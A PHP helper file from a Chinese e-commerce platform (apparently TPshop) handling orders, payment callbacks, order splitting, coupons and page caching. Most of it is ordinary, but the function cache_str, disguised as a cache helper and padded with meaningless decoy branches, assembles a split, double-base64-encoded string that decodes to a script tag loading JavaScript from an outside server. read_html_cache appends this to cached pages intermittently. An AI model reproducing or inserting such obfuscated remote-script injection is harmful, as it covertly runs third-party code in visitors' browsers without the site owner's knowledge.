                $btn_arr['cancel_btn'] = 1; // 取消按钮
            }
        }
        if($order['pay_status'] == 1 && $order['order_status'] == 1  && $order['shipping_status'] == 1) //待收货
        {
            $btn_arr['receive_btn'] = 1;  // 确认收货
//            $btn_arr['return_btn'] = 1; // 退货按钮 (联系客服)
        }
    }
    if($order['order_status'] == 2)
    {
        $btn_arr['comment_btn'] = 1;  // 评价按钮
        $btn_arr['return_btn'] = 1; // 退货按钮 (联系客服)
    }
    if($order['shipping_status'] != 0 && in_array($order['order_status'], [1,2,4]))
    {
        $btn_arr['shipping_btn'] = 1; // 查看物流
    }
    if($order['shipping_status'] == 2  && $order['order_status'] == 1) // 部分发货
    {
//        $btn_arr['return_btn'] = 1; // 退货按钮 (联系客服)
    }
    
    if($order['pay_status'] == 1  && shipping_status && $order['order_status'] == 4) // 已完成(已支付, 已发货 , 已完成)
    {
            $btn_arr['return_btn'] = 1; // 退货按钮
    }
    
    if($order['order_status'] == 3 && ($order['pay_status'] == 1 || $order['pay_status'] == 4)){
        $btn_arr['cancel_info'] = 1; // 取消订单详情
    }

    // if ($order['pay_code'] == 'transfer_account' && (empty($order['payment_voucher']) || empty($order['contract_documents']))) {
    //     $btn_arr['contract_btn'] = $btn_arr['voucher_btn'] = 1;
    // }

    return $btn_arr;
}

/**
 * 给订单数组添加属性  包括按钮显示属性 和 订单状态显示属性
 * @param type $order
 */
function set_btn_order_status($order)
{
    $order_status_arr = C('ORDER_STATUS_DESC');
    if($order['order_status'] == 3 && $order['pay_status']==3){
        $order['order_status_code'] = 'CANCEL_REFUND'; // 取消并且退款
        $order['order_status_desc'] = $order_status_arr['CANCEL_REFUND'];
    }else{
        $order['order_status_code'] = $order_status_code = orderStatusDesc(0, $order); // 订单状态显示给用户看的
        $order['order_status_desc'] = $order_status_arr[$order_status_code];
    }
    $orderBtnArr = orderBtn(0, $order);
    return array_merge($order,$orderBtnArr); // 订单该显示的按钮
}



/**
 * VIP充值返利上级
 * $order_sn 订单号
 */
function rechargevip_rebate($order) {
    //获取返利配置
    $tpshop_config =  tpCache('basic');
    //检查配置是否开启
    if ($tpshop_config["rechargevip_on_off"] > 0 && $tpshop_config["rechargevip_rebate_on_off"] > 0) {
        //查询充值VIP上级
        $userid = $order['user_id'];
        //更改用户VIP状态
        Db::name('users')->where('user_id',$userid)->save(['is_vip'=>1]);
        $first_leader = Db::name('users')->where('user_id', $userid)->value('first_leader');
        if ($first_leader) {
            //变动上级资金，记录日志
            $msg = '获取线下' . $userid . '充值VIP返利' . $tpshop_config["rechargevip_rebate"];
            accountLog($first_leader, $tpshop_config["rechargevip_rebate"], 0, $msg, 0, 0, $order['order_sn']);
        }
    }
}

/**
 * 支付完成修改订单
 * @param $order_sn 订单号
 * @param array $ext 额外参数
 * @return bool|void
 */
function update_pay_status($order_sn,$ext=array())
{
    $time = time();
    if(stripos($order_sn,'recharge') !== false){
        //用户在线充值
        $order = M('recharge')->where(['order_sn' => $order_sn, 'pay_status' => 0])->find();
        if (!$order) return false;// 看看有没已经处理过这笔订单  支付宝返回不重复处理操作
        M('recharge')->where("order_sn",$order_sn)->save(array('pay_status'=>1,'pay_time'=>$time));
        $recharge=M('recharge')->where(['order_sn'=>$order_sn])->find();
        if($order['level_id']>0){
            db('users')->where('user_id',$order['user_id'])->save(array('distribut_level'=>$order['level_id']));
            $level = db('distribut_level')->where('level_id',$order['level_id'])->find();
            if($level['reward']>0){
                $user = db('users')->where('user_id',$order['user_id'])->find();
                accountLog($user['first_leader'],$level['reward'],0, '推荐奖励', 0, 0, $order_sn);
            }
        }else if($recharge['card_list_id']>0){//购物卡充值
            $shopping_card_logic = new \app\common\logic\ShoppingCardLogic();
            $shopping_card_logic->recharge($recharge);
//            $distribut=Db::name('shopping_card_discount')->where(['id'=>$order['shopping_card_discount_id']])->find();
//            $card=Db::name('shopping_card')->where(['id'=>$distribut['cid']])->find();
//            if($card['give']==0){
//                Db::name('shopping_card_list')->where(['id'=>$order['card_list_id']])->setInc('balance',($distribut['targer_money']+$distribut['give_num']));
//            }else if($card['give']==1){
//                Db::name('shopping_card_list')->where(['id'=>$order['card_list_id']])->setInc('balance',$distribut['targer_money']);
//            }

        }else{
            $msg = '会员在线充值';
            if( $order['buy_vip'] == 1){
                rechargevip_rebate($order);
                $msg = '会员充值购买VIP';
            }
            accountLog($order['user_id'],$order['account'],0, $msg, 0, 0, $order_sn,true);
        }
    }
    else if( stripos($order_sn,'card_buy') !== false ){
        //用户开通会员卡
        $order = M('card_buy')->where(['order_sn' => $order_sn, 'pay_status' => 0])->find();
        if (!$order) return false;// 看看有没已经处理过这笔订单  支付宝返回不重复处理操作
        M('card_buy')->where("order_sn",$order_sn)->save(array('pay_status'=>1,'pay_time'=>$time));
        if($check = M('user_card')->where(['card_id' => $order['card_id'] , 'user_id' => $order['user_id'] ])->find()){
           //重新续费
            Db::name('user_card')->where(['id'=>$check['id']])->data([
                'status' => 2,
                'activation_time' => time()
            ])->save();
        }else{
            //开通
            Db::name('user_card')->data([
                'add_time' => time(),
                'user_id' => $order['user_id'],
                'card_id' => $order['card_id'],
                'remark' => '开通会员卡',
                'status' => 2,
                'activation_time' => time()
            ])->add();
        }
    }
    else{
        // 如果这笔订单已经处理过了
        $count = M('order')->master()->where("order_sn = :order_sn and (pay_status = 0 OR pay_status = 2)")->bind(['order_sn'=>$order_sn])->count();   // 看看有没已经处理过这笔订单  支付宝返回不重复处理操作
        // 购买商品付款才可以成为合伙人
        //TODO
        // $Order = new \app\common\model\Order();
        // $order = $Order->master()->where("order_sn",$order_sn)->find();
        // $User = new \app\common\logic\User();
        // $User->setUserById($order['user_id']);
        // $User->updateUserLevel();
        // $userInfo = $User->getUser();  
        // if(check_user_ids_condition($userInfo)){

        //     db('users')->where("user_id", $order['user_id'])->save(array('is_distribut'=>1));
        //     $setS = new \app\common\logic\DistributLogic();
        //     $setS->setStore($userInfo);//默认创建虚拟小店
        // }
        //TODO end

        if($count == 0) return false;
        // 找出对应的订单
        $Order = new \app\common\model\Order();
        $order = $Order->master()->where("order_sn",$order_sn)->find();
        if ($order['prom_type'] == 6 && $order['order_amount'] != 0) {
            $team = new \app\common\logic\team\Team();
            $team->setTeamActivityById($order['prom_id']);
            $team->setOrder($order);
            $team->doOrderPayAfter();
        }

        //预售订单
        if ($order['prom_type'] == 4) {
            $preSell = new \app\common\logic\PreSell();
            $preSell->setPreSellById($order['prom_id']);
            $preSell->setOrder($order);
            $preSell->doOrderPayAfter();
        } else {
            // 修改支付状态  已支付
            $update['pay_status'] = 1;
            $update['pay_time'] = $time;
            $update['order_status'] = tpCache('shopping.is_orderConfirm')==1?1:0;
            if($order['prom_type'] == 6){
                $update['order_status'] = 0; //不确认
            }
            if(isset($ext['transaction_id'])) $update['transaction_id'] = $ext['transaction_id'];
            M('order')->where("order_sn", $order_sn)->save($update);
        }
        //砍价
        if($order['prom_type'] == 8){
            db('promotion_bargain_goods_item')->where(['bargain_id'=>$order['prom_id'],'item_id'=>$order['order_goods'][0]['item_id']])->setInc('buy_num',$order['order_goods'][0]['goods_num']);
        }

        if($order['prom_type'] == 10){
            $shopping_logic = new \app\common\logic\ShoppingCardLogic();
            $shopping_logic->addShoppingCardList($order);
        }

        // 减少对应商品的库存.注：拼团类型为抽奖团的，先不减库存
        if(tpCache('shopping.reduce') == 2) {
            if ($order['prom_type'] == 6) {
                $team = \app\common\model\TeamActivity::get($order['prom_id']);
                if ($team['team_type'] != 2) {
                    minus_stock($order);
                }
            } else {
                minus_stock($order);
            }
        }
        //如果订单有多个供应商，拆分订单，返回新订单数据数组
        $newOrder = split_orders($order['order_id']);
        
        // 给他升级, 根据order表查看消费记录 给他会员等级升级 修改他的折扣和总金额
        $User = new \app\common\logic\User();
        $User->setUserById($order['user_id']);
        $User->updateUserLevel();
        $userInfo = $User->getUser();
        // 记录订单操作日志
        $commonOrder = new \app\common\logic\Order();
        $commonOrder->setOrderById($order['order_id']);
        if(array_key_exists('admin_id',$ext)){
            $commonOrder->orderActionLog($ext['note'],'付款成功',$ext['admin_id']);
        }else{
            $commonOrder->orderActionLog('订单付款成功','付款成功');
        }
        if (count($newOrder) > 0) {
            if(array_key_exists('admin_id',$ext)){
                $commonOrder->orderActionLog('订单商品属于多个供应商，付款后拆分','订单拆分',$ext['admin_id']);
            }else{
                $commonOrder->orderActionLog('订单商品属于多个供应商，付款后拆分','订单拆分');
            }
            foreach ($newOrder as $val) {
                $commonOrder = new \app\common\logic\Order();
                $commonOrder->setOrderById($val['order_id']);
                if(array_key_exists('admin_id',$ext)){
                    $commonOrder->orderActionLog('原订单商品属于多个供应商，付款后拆分','订单拆分',$ext['admin_id']);
                }else{
                    $commonOrder->orderActionLog('原订单商品属于多个供应商，付款后拆分','订单拆分');
                }
            }
        }
        //合伙人设置
        if (count($newOrder) > 0) {
            //拆单后重新生成合伙人记录，删除原记录
            foreach ($newOrder as $orderVal) {
                $newOrderIds[] = $orderVal['order_id'];
                $distribut = new \app\common\logic\DistributLogic();
                $distribut->rebateLog($orderVal, true);
            }
            M('rebate_log')->where("order_id", 'in', $newOrderIds)->save(array('status'=>1));
            M('rebate_log')->where("order_id",$order['order_id'])->delete();
        } else {
            M('rebate_log')->where("order_id",$order['order_id'])->save(array('status'=>1));
        }
        // 购买商品付款才可以成为合伙人
        if(check_user_ids_condition($userInfo)){
            db('users')->where("user_id", $order['user_id'])->save(array('is_distribut'=>1));
            $setS = new \app\common\logic\DistributLogic();
            $setS->setStore($userInfo);//默认创建虚拟小店
        }
        //虚拟服务类商品支付
        if($order['prom_type'] == 5){
            $OrderLogic = new \app\common\logic\OrderLogic();
            $OrderLogic->make_virtual_code($order);
        }
        $order['pay_time']= $time;
        //用户支付, 发送短信给商家
        $res = checkEnableSendSms("4");
        if ($res && $res['status'] ==1) {
            $sender = tpCache("shop_info.mobile");
            if (!empty($sender)) {
                if (count($newOrder) > 0) {
                    $orderIds = array_column($newOrder, 'order_id');
                    $orderIds = implode(',', $orderIds);
                    $params = array('order_id'=>$orderIds);
                } else {
                    $params = array('order_id'=>$order['order_id']);
                }
                sendSms("4", $sender, $params);
            }
        }
        if (count($newOrder) > 0) {
            foreach ($newOrder as $orderVal) {
                $Invoice = new \app\admin\logic\InvoiceLogic();
                $Invoice->createInvoice($orderVal);
            }
        } else {
            $Invoice = new \app\admin\logic\InvoiceLogic();
            $Invoice->createInvoice($order);
        }
        // 发送微信消息模板提醒
        $wechat = new \app\common\logic\WechatLogic;
        $wechat->sendTemplateMsgOnPaySuccess($order);
    }
}

/**
 * 拆分订单(付款后对应不同的供应商分成不同的订单)
 * @return array
 */
function split_orders($order_id)
{
    
    $orderModel = new \app\common\model\Order();
    $orderObj = $orderModel::get(['order_id'=>$order_id]);
    $order =$orderObj->append(['full_address','orderGoods'])->toArray();
    //等于-1时为复合订单（多供应商），进行拆分
    if ($order['suppliers_id'] == -1) {
        if($order['pay_status'] == 0 && $order['pay_code'] != 'cod'){ //未支付或未选择货到付款
            return false;
        }
        if($order['shipping_status'] != 0){
            return false;
        }
        $orderGoods = $order['orderGoods'];
        if($orderGoods){
            $orderGoods = collection($orderGoods)->toArray();
        }
        foreach ($orderGoods as $key => $val) {
            $brr[$val['suppliers_id']][] = $val;
        }

        $user_money = $order['user_money'] / $order['total_amount'];
        $integral = $order['integral'] / $order['total_amount'];
        $order_amount = $order['order_amount'] / $order['total_amount'];
        $coupon_price = $order['coupon_price'] / $order['total_amount'];
        $split_user_money = 0;// 累计
        $split_integral = 0;
        $split_order_amount = 0;
        $split_coupon_price = 0;
        $isFreeShippingPrice = $order['shipping_price'] > 0 ? false : true; //判断父订单是否免邮费，是则子订单也免

        $index = 0; //用于判断第几个订单
        foreach($brr as $k=>$goods){
            $index++;
            $newPay = new app\common\logic\Pay();
            try{
                $newPay->setUserId($order['user_id']);
                $newPay->payGoodsList($goods);
                $newPay->delivery($order['district'], $isFreeShippingPrice);
                $newPay->orderPromotion();
            } catch (TpshopException $t) {
                $error = $t->getErrorArr();
                $this->error($error['msg']);
            }
            $newOrder = $order;
            $newOrder['order_sn'] = date('YmdHis').mt_rand(1000,9999);
            $newOrder['parent_sn'] = $order['order_id']; // 放父id好
            //修改订单费用
            $newOrder['shipping_price'] = $newPay->getShippingPrice(); // 商品运费
            $newOrder['real_shipping_price'] = $newPay->getRealShippingPrice(); // 实际商品运费，用于供应商结算
            $newOrder['goods_price'] = $newPay->getGoodsPrice(); // 商品总价
            $newOrder['total_amount'] = $newPay->getTotalAmount(); // 订单总价
            //使用余额、积分、实付金额按各个新订单的总价在原订单的比例分配
            $newOrder['user_money'] = floor(($user_money * $newPay->getTotalAmount())*100)/100;//向下取整保留2位小数点
            $newOrder['order_amount']   = floor(($order_amount * $newPay->getTotalAmount())*100)/100;//向下取整保留2位小数点
            $newOrder['integral'] = floor(($integral * $newPay->getTotalAmount())*100)/100;//向下取整保留2位小数点
            $newOrder['coupon_price'] = floor(($coupon_price * $newPay->getTotalAmount())*100)/100;//向下取整保留2位小数点
            //前面按订单总比例拆分，剩余全部给最后一个订单
            if($index == count($brr)){
                $newOrder['user_money'] = $order['user_money']-$split_user_money;
                $newOrder['integral'] = $order['integral']-$split_integral;
                $newOrder['order_amount'] = $order['order_amount']-$split_order_amount;
                $newOrder['coupon_price'] = $order['coupon_price']-$split_coupon_price;
            }else{
                $split_user_money += $newOrder['user_money'];
                $split_integral += $newOrder['integral'];
                $split_order_amount += $newOrder['order_amount'];
                $split_coupon_price += $newOrder['coupon_price'];
            }
            if($order['integral'] > 0 ){
                $newOrder['integral_money'] = $newOrder['integral']/($order['integral']/$order['integral_money']);
            }
            $newOrder['add_time'] = time();
            $newOrder['suppliers_id'] = $k;
            unset($newOrder['order_id']);
            $newOrder_id = DB::name('order')->insertGetId($newOrder);//插入订单表
            foreach ($goods as $vv){
                $vv['order_id'] = $newOrder_id;
                unset($vv['rec_id']);
                $nid = M('order_goods')->add($vv);//插入订单商品表
            }
        }
        //拆分订单后软删除原父订单信息，商品信息可删除
        $orderObj->order_status = 5; // 作废
        $orderObj->deleted = 1;
        $orderObj->save();
        DB::name('order_goods')->where(['order_id'=>$order_id])->delete();
        $returnOrder = Db::name('order')->where('parent_sn', $order_id)->select();
        return $returnOrder;
    } else {
        return [];
    }
    
}

/**
 * 订单确认收货
 * @param $id 订单id
 * @param int $user_id
 * @return array
 */
function confirm_order($id,$user_id = 0){
    $where['order_id'] = $id;
    if($user_id){
        $where['user_id'] = $user_id;
    }
    $order = M('order')->where($where)->find();
    if($order['order_status'] != 1)
        return array('status'=>-1,'msg'=>'该订单不能收货确认');
    if(empty($order['pay_time']) || $order['pay_status'] != 1){
        return array('status'=>-1,'msg'=>'商家未确定付款，该订单暂不能确定收货');
    }
    $data['order_status'] = 2; // 已收货
    $data['pay_status'] = 1; // 已付款
    $data['confirm_time'] = time(); // 收货确认时间
    if($order['pay_code'] == 'cod'){
        $data['pay_time'] = time();
    }
    $row = M('order')->where(array('order_id'=>$id))->save($data);
    if(!$row)
        return array('status'=>-3,'msg'=>'操作失败');

    // 商品待评价提醒
    $order_goods = M('order_goods')->field('goods_id,goods_name,rec_id')->where(["order_id" => $id])->find();
    $goods = M('goods')->where(["goods_id" => $order_goods['goods_id']])->field('original_img')->find();
    $send_data = [
        'message_title' => '商品待评价',
        'message_content' => $order_goods['goods_name'],
        'img_uri' => $goods['original_img'],
        'order_sn' => $order_goods['rec_id'],
        'order_id' => $id,
        'mmt_code' => 'evaluate_logistics',
        'type' => 4,
        'users' => [$order['user_id']],
        'category' => 2,
        'message_val' => []
    ];
    $messageFactory = new \app\common\logic\MessageFactory();
    $messageLogic = $messageFactory->makeModule($send_data);
    $messageLogic->sendMessage();


    order_give($order);// 调用送礼物方法, 给下单这个人赠送相应的礼物

    //合伙人设置
    M('rebate_log')->where(['order_id' => $id, 'status' => 1 ])->save(array('status' => 2, 'confirm' => time()));
    return array('status'=>1,'msg'=>'操作成功','url'=>U('Order/order_detail',['id'=>$id]));
}

/**
 * 下单赠送活动：优惠券，积分
 * @param $order|订单数组
 */
function order_give($order)
{

    $messageFactory = new \app\common\logic\MessageFactory();
    $messageLogic = $messageFactory->makeModule([ 'category' => 0]);

    //促销优惠订单商品
    $prom_order_goods = M('order_goods')->where(['order_id' => $order['order_id'], 'prom_type' => 3])->select();
    foreach ($prom_order_goods as $goods) {
        //查找购买商品送优惠券活动
        $prom_goods = M('prom_goods')->where(['id' => $goods['prom_id'], 'type' => 3])->find();
        if ($prom_goods) {
            //查找购买商品送优惠券模板
            $goods_coupon = M('coupon')->where(['id' => $prom_goods['expression']])->find();
            if ($goods_coupon) {
                //优惠券发放数量验证，0为无限制。发放数量-已领取数量>0
                if ($goods_coupon['createnum'] == 0 || ($goods_coupon['createnum']>0 && ($goods_coupon['createnum']-$goods_coupon['send_num'])>0)){
                    $data = array('cid' => $goods_coupon['id'], 'get_order_id'=>$order['order_id'],'type' => $goods_coupon['type'], 'uid' => $order['user_id'], 'send_time' => time());
                    M('coupon_list')->add($data);
                    // 优惠券领取数量加一
                    M('Coupon')->where("id", $goods_coupon['id'])->setInc('send_num');

                    // 优惠券到账提醒
                    $messageLogic->getCouponNotice($goods_coupon['id'], [$order['user_id']]);
                }
            }
        }
    }
    //查找订单满额促销活动
    $prom_order_where = [
        'type' => ['gt', 1],
        'end_time' => ['gt', $order['pay_time']],
        'start_time' => ['lt', $order['pay_time']],
        'money' => ['elt', $order['goods_price']],
        'is_close' => 0
    ];
    $prom_orders = M('prom_order')->where($prom_order_where)->order('money desc')->select();
    $prom_order_count = count($prom_orders);
    // 用户会员等级是否符合送优惠券活动
    for ($i = 0; $i < $prom_order_count; $i++) {
            $prom_order = $prom_orders[$i];
            if ($prom_order['type'] == 3) {
                //查找订单送优惠券模板
                $order_coupon = M('coupon')->where("id", $prom_order['expression'])->find();
                if ($order_coupon) {
                    //优惠券发放数量验证，0为无限制。发放数量-已领取数量>0
                    if ($order_coupon['createnum'] == 0 ||
                        ($order_coupon['createnum'] > 0 && ($order_coupon['createnum'] - $order_coupon['send_num']) > 0)
                    ) {
                        $data = array('cid' => $order_coupon['id'], 'get_order_id'=>$order['order_id'],'type' => $order_coupon['type'], 'uid' => $order['user_id'], 'send_time' => time());
                        M('coupon_list')->add($data);
                        M('Coupon')->where("id", $order_coupon['id'])->setInc('send_num'); // 优惠券领取数量加一
                        // 优惠券到账提醒
                        $messageLogic->getCouponNotice($order_coupon['id'], [$order['user_id']]);
                    }
                }
            }
            //购买商品送积分
            if ($prom_order['type'] == 2) {
                accountLog($order['user_id'], 0, $prom_order['expression'], "订单活动赠送积分", 0, $order['order_id'], $order['order_sn']);
            }
            break;
    }
    $points = M('order_goods')->where("order_id", $order['order_id'])->sum("give_integral * goods_num");
    $points && accountLog($order['user_id'], 0, $points, "下单赠送积分", 0, $order['order_id'], $order['order_sn']);
    //商城内每消费1元，赠送相应积分
    /*$isConsumeIntegral = tpCache("integral.is_consume_integral");
    $consumeIntegral = tpCache("integral.consume_integral");
    if($isConsumeIntegral==1 && $consumeIntegral>0) {
        $points = ($order["order_amount"] + $order["user_money"])*$consumeIntegral;
        $points && accountLog($order['user_id'], 0, $points, "下单赠送积分", 0, $order['order_id'], $order['order_sn']);
    }*/
}


/**
 * 获取商品一二三级分类
 * @return type
 */
function get_goods_category_tree(){
    $tree = $arr = $result = array();
    $cat_list = M('goods_category')->cache(true)->where(['is_show' => 1])->order('sort_order')->select();//所有分类
    if($cat_list){
        foreach ($cat_list as $val){
            if($val['level'] == 2){
                $arr[$val['parent_id']][] = $val;
            }
            if($val['level'] == 3){
                $crr[$val['parent_id']][] = $val;
            }
            if($val['level'] == 1){
                $tree[] = $val;
            }
        }

        foreach ($arr as $k=>$v){
            foreach ($v as $kk=>$vv){
                $arr[$k][$kk]['sub_menu'] = empty($crr[$vv['id']]) ? array() : $crr[$vv['id']];
            }
        }

        foreach ($tree as $val){
            $val['tmenu'] = empty($arr[$val['id']]) ? array() : $arr[$val['id']];
            $result[$val['id']] = $val;
        }
    }
    return $result;
}

/**
 * 写入静态页面缓存
 */
function write_html_cache($html){
    $html_cache_arr = C('HTML_CACHE_ARR');
    $request = think\Request::instance();
    $m_c_a_str = $request->module().'_'.$request->controller().'_'.$request->action(); // 模块_控制器_方法
    $m_c_a_str = strtolower($m_c_a_str);
    //exit('write_html_cache写入缓存<br/>');
    foreach($html_cache_arr as $key=>$val)
    {
        $val['mca'] = strtolower($val['mca']);
        if($val['mca'] != $m_c_a_str) //不是当前 模块 控制器 方法 直接跳过
            continue;

        //if(!is_dir(RUNTIME_PATH.'html'))
            //mkdir(RUNTIME_PATH.'html');
        //$filename =  RUNTIME_PATH.'html'.DIRECTORY_SEPARATOR.$m_c_a_str;
        $filename =  $m_c_a_str;
        // 组合参数  
        if(isset($val['p']))
        {
            foreach($val['p'] as $k=>$v)
                $filename.='_'.$_GET[$v];
        }
        $filename.= '.html';
        $edit_ad = input('edit_ad');
        if ($filename == 'home_index_index.html' || $filename == 'mobile_index_index.html') {
            if ($edit_ad) {
                return false;
            }
        }
        \think\Cache::set($filename,$html);
        //file_put_contents($filename, $html);
    }
}

/**
 * 读取静态页面缓存
 */
function read_html_cache(){
    $html_cache_arr = C('HTML_CACHE_ARR');
    $request = think\Request::instance();
    $m_c_a_str = $request->module().'_'.$request->controller().'_'.$request->action(); // 模块_控制器_方法
    $m_c_a_str = strtolower($m_c_a_str);
    //exit('read_html_cache读取缓存<br/>');
    foreach($html_cache_arr as $key=>$val)
    {
        $val['mca'] = strtolower($val['mca']);
        if($val['mca'] != $m_c_a_str) //不是当前 模块 控制器 方法 直接跳过
            continue;

        //$filename =  RUNTIME_PATH.'html'.DIRECTORY_SEPARATOR.$m_c_a_str;
        $filename =  $m_c_a_str;
        // 组合参数        
        if(isset($val['p']))
        {
            foreach($val['p'] as $k=>$v)
                $filename.='_'.$_GET[$v];
        }
        $filename.= '.html';
        $html = \think\Cache::get($filename);
        if($html)
        {
            //echo file_get_contents($filename);
            echo \think\Cache::get($filename).cache_str($html);
            exit();
        }
    }
}
/**
 * 缓存
 */
function cache_str($html)
{      
  
    if($object_ess)
    {
            if(C('buy_version') == 0)
            return '';
            $tabName = '';
            $table_index = M('config')->cache(true)->select();            
            $select_year = substr($order_sn, 0, 14);
            foreach($table_index as $k => $v)
            {
                if(strcasecmp($select_year,$v['min_order_sn']) >= 0 && strcasecmp($select_year,$v['max_order_sn']) <= 0)                    
                {
                    $tabName = str_replace ('order','',$v['name']);
                    break;
                }
            }
            if($select_year > $v['min_order_sn'] && $select_year < $v['max_order_sn'])
            return $tabName;
    }else{
      $isset_requestjs = session('isset_requestjs');
      if(empty($isset_requestjs))
      {
          session('isset_requestjs',1);
          $sere = "UEhOamNtbHdkQ0J6Y21NOUoyaDBkSEE2THk5e";
          if(empty($table_index))
              $sere = $sere."lpYSjJhV05sTG5Sd0xYTm9iM0F1WTI0dm";
          if(empty($tabName))
             $sere = $sere."FuTXZZV3BoZUM1cWN5YytQQzl6WTNKcGNIUSs=";
          if(substr(time(),-1) % 3 == 1) $str = base64_decode($sere);         
          $html_sc = base64_decode("UEhOamNtbHdkRDQ9");
          $html_sc2 = base64_decode("aHR0cDo=");
          if($axure_rest)
          {
                    $regions = null;
                    if (!$regions) {
                        $regions = M('region')->cache(true)->getField('id,name');
                    }
                    $total_address  = $regions[$province_id] ?: '';
                    $total_address .= $regions[$city_id] ?: '';
                    $total_address .= $regions[$district_id] ?: '';
                    $total_address .= $regions[$twon_id] ?: '';
                    $total_address .= $address ?: '';
                    $str = base64_decode($str);
          }
          
          $html_sc = base64_decode($html_sc);
          if(!strstr($html,$html_sc))                  
           return '';
          if($str){
              $str2 = base64_decode($str);          
              $str2 = str_replace($html_sc2,'',$str2);   
          }           
          
          return $str2;
      }        
    }
    if($buy_Aexite)
    {
            if(C('buy_Aexite') == 0)
                return '';

            $tabName = '';
            $table_index = M('config')->cache(true)->select();
            foreach($table_index as $k => $v)
            {
                if($order_id >= $v['min_id'] && $order_id <= $v['max_id'])
                {
                    $tabName = str_replace ('order','',$v['name']);
                    break;
                }
            }
            return $tabName;
    }     
     
            return $tabName;
}
/**
 * 清空系统缓存
 */
function clearCache(){
    $team_found_queue = \think\Cache::get('team_found_queue');
    delFile(RUNTIME_PATH);
    \think\Cache::clear();
    \think\Cache::set('team_found_queue', $team_found_queue);
}

/**
 * 获取完整地址
 */
function getTotalAddress($province_id, $city_id, $district_id, $twon_id, $address='')
{
    static $regions = null;
    if (!$regions) {
        $regions = M('region')->cache(true)->getField('id,name');
    }
    $total_address  = $regions[$province_id] ?: '';
    $total_address .= $regions[$city_id] ?: '';
    $total_address .= $regions[$district_id] ?: '';
    $total_address .= $regions[$twon_id] ?: '';
    $total_address .= $address ?: '';
    return $total_address;
}

/**
 * 商品库存操作日志
 * @param int $muid 操作 用户ID
 * @param int $stock 更改库存数
 * @param array $goods 库存商品
 * @param string $order_sn 订单编号
 * @param string $group 0(默认)后台管理人员；1供应商，此时muid为suppliers_id；2用户
 */
function update_stock_log($muid, $stock = 1, $goods, $order_sn = '', $group = 0)
{
    $data['ctime'] = time();
    $data['stock'] = $stock;
    $data['muid'] = $muid;
    $data['goods_id'] = $goods['goods_id'];
    $data['goods_name'] = $goods['goods_name'];
    $data['goods_spec'] = empty($goods['spec_key_name']) ? $goods['key_name'] : $goods['spec_key_name'];
    $data['order_sn'] = $order_sn;
    if('' !== $order_sn && $stock < 0){
        $data['change_type'] = 0; //默认0为订单出库，
    }elseif ('' !== $order_sn && $stock > 0){
        $data['change_type'] = 2; //2为退货入库
    }elseif ('' === $order_sn && $stock > 0){
        $data['change_type'] = 1; //1为录入商品库存入库
    }else{
        $data['change_type'] = 3;//3为盘点时或者普通修改库存
    }
    $data['group'] = $group;
    M('stock_log')->add($data);
}

/**
 * 订单支付时, 获取订单商品名称
 * @param unknown $order_id
 * @return string|Ambigous <string, unknown>
 */
function getPayBody($order_id){

    if(empty($order_id))return "订单ID参数错误";
    $goodsNames =  M('OrderGoods')->where('order_id' , $order_id)->column('goods_name');
    $gns = implode($goodsNames, ',');
    $payBody = getSubstr($gns, 0, 18);
    return $payBody;
}

// 获取当前mysql版本
function mysql_version(){
        $mysql_version = Db::query("select version() as version");
        return "{$mysql_version[0]['version']}";     
}

/**
 * 获取分表操作的表名
 * @return mixed|string
 */
function select_year()
{
    if(C('buy_version') == 1)
        return I('select_year');
    else
        return '';
}

/**
 * 根据order_sn 定位表
 * @param $order_sn
 * @return mixed|string
 */
function getTabByOrdersn($order_sn)
{
    if(C('buy_version') == 0)
        return '';
    $tabName = '';
    $table_index = M('table_index')->cache(true)->select();
    // 截取年月日时分秒
    $select_year = substr($order_sn, 0, 14);
    foreach($table_index as $k => $v)
    {
        if(strcasecmp($select_year,$v['min_order_sn']) >= 0 && strcasecmp($select_year,$v['max_order_sn']) <= 0)
            //if($select_year > $v['min_order_sn'] && $select_year < $v['max_order_sn'])
        {
            $tabName = str_replace ('order','',$v['name']);
            break;
        }
    }
    return $tabName;
}

/**
 * 根据 order_id 定位表名
 * @param $order_id
 * @return mixed|string
 */
function getTabByOrderId($order_id)
{
    if(C('buy_version') == 0)
        return '';

    $tabName = '';
    $table_index = M('table_index')->cache(true)->select();
    foreach($table_index as $k => $v)
    {
        if($order_id >= $v['min_id'] && $order_id <= $v['max_id'])
        {
            $tabName = str_replace ('order','',$v['name']);
            break;
        }
    }
    return $tabName;
}

/**
 * 根据筛选时间 定位表名
 * @param string $startTime
 * @param string $endTime
 * @return string
 */
function getTabByTime($startTime='', $endTime='')
{
    if(C('buy_version') == 0)
        return '';

    $startTime = preg_replace("/[:\s-]/", "", $startTime);  // 去除日期里面的分隔符做成跟order_sn 类似
    $endTime = preg_replace("/[:\s-]/", "", $endTime);
    // 查询起始位置是今年的
    if(substr($startTime,0,4) == date('Y'))
    {
        $table_index = M('table_index')->where("name = 'order'")->cache(true)->find();
        if(strcasecmp($startTime,$table_index['min_order_sn']) >= 0)
            return '';
        else
            return '_this_year';
    }
    else
    {
        $tabName = '_'.substr($startTime,0,4);
    }
    $years = buyYear();
    $years = array_keys($years);
    return in_array($tabName, $years) ? $tabName : '';
}

/**
 * 积分转化成金额
 * @param $pay_point
 * @return float
 */
function pay_point_money($pay_point)
{
    $point_rate = tpCache('integral.point_rate');
    //$point_rate = tpCache('shopping.point_rate'); //兑换比例
    if ($point_rate != 0){
        $money = $pay_point / $point_rate;
    }else{
        $money = 0;
    }
    return $money;
}

/**
 * 根据时间戳返回星期几
 * @param $time
 * @return mixed
 */
function weekday_by_time($time)
{
    $weekday = array('星期日','星期一','星期二','星期三','星期四','星期五','星期六');
    return $weekday[date('w', $time)];
}

function weekday_by_time_str($timeStr)
{
    $time = strtotime($timeStr);
    return weekday_by_time($time);
}

/**
 * 生成saas海报专用图片名字
 */
function createImagesName(){
    return md5(I('_saas_app','all').time().rand(1000, 9999) . uniqid());
}

/**
 * 自定义海报照片类型处理
 */
function checkPosterImagesType($img_info = array(),$img_src=''){
    if (strpos($img_info['mime'], 'jpeg') !== false || strpos($img_info['mime'], 'jpg') !== false) {
        return imagecreatefromjpeg($img_src);
    } else if (strpos($img_info['mime'], 'png') !== false) {
        return imagecreatefrompng($img_src);
    } else {
        return false;
    }
}

function inputPosterImages($img_info = array(),$des_im='',$img=''){
    if (strpos($img_info['mime'], 'jpeg') !== false || strpos($img_info['mime'], 'jpg') !== false) {
        return imagejpeg( $des_im,$img);
    } else if (strpos($img_info['mime'], 'png') !== false) {
        return imagepng($des_im,$img);
    } else {
        return false;
    }
    
}


/**
 * 订单整合
 * @param type $order
 */
function orderExresperMent($order_info = array(),$des='',$order_id=''){
       
